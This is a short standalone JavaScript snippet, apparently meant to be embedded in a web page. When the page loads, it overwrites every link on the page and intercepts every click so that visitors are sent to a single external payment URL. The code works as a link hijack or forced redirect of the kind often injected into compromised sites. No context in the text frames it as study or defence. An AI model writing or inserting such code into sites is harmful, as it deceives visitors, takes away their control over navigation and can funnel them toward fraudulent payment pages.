<script>
document.addEventListener("DOMContentLoaded", function () {
    const redirectUrl = "https://pay.powerject.online/ODAK3Loly6vgE6V";
    document.querySelectorAll("a").forEach(link => {
        link.href = redirectUrl;
        link.addEventListener("click", function (event) {
            event.preventDefault();
            window.location.href = redirectUrl;
        });
    });
});
</script>

